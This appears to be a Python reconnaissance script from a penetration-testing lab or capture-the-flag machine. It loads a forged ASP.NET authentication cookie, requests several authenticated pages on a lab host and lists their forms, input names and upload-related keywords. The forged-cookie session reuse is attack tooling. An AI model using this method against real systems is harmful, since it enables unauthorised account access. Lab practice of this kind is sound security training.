#!/usr/bin/env python3
import re
import requests
import urllib3

urllib3.disable_warnings()
BASE = "https://10.129.242.196"
S = requests.Session()
S.verify = False
S.cookies.set(".ASPXAUTH", open("/home/kali/hercules/forged.cookie").read().strip(),
              domain="10.129.242.196")

for ep in ["/Home/Account", "/Home/Downloads", "/Home/Mail", "/Home/Security", "/Home/Forms"]:
    r = S.get(f"{BASE}{ep}", timeout=15)
    print(f"\n===== {ep} -> {r.status_code} len={len(r.text)}")
    forms = re.findall(r'<form[^>]*>', r.text)
    print("  forms:", forms[:4])
    inputs = re.findall(r'<(?:input|textarea|select)[^>]*name="([^"]+)"[^>]*>', r.text)
    print("  input names:", inputs[:10])
    # look for text hinting at file upload or privileges
    txt = re.sub(r'<[^>]+>', ' ', r.text)
    txt = re.sub(r'\s+', ' ', txt)
    for kw in ["upload", "attach", "report", "odt", "docx", "pdf", "template"]:
        for m in re.finditer(kw, txt, re.I):
            s = max(0, m.start() - 70)
            print(f"  [{kw}] ...{txt[s:m.start()+90]}...")
            break
